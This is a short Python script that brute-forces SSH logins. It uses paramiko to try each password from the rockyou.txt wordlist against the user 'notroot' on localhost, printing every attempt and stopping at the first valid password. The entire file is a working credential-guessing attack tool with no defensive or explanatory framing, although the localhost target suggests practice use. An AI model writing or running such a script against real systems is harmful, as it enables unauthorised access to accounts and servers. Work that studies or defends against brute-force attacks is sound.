import paramiko

host = "127.0.0.1"
username = "notroot"
attempts = 0

# Open the password list file
with open("rockyou.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")  # Strip newline characters
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            
            # Initialize the SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host keys
            
            # Attempt to connect using the current password
            ssh.connect(host, username=username, password=password, timeout=1)
            
            print("[>] Valid password found: '{}'!".format(password))
            ssh.close()  # Close the connection
            break  # Stop after finding a valid password
        
        except paramiko.AuthenticationException:
            print("[X] Invalid password!")
        except Exception as e:
            print(f"[X] Error: {e}")
        
        attempts += 1
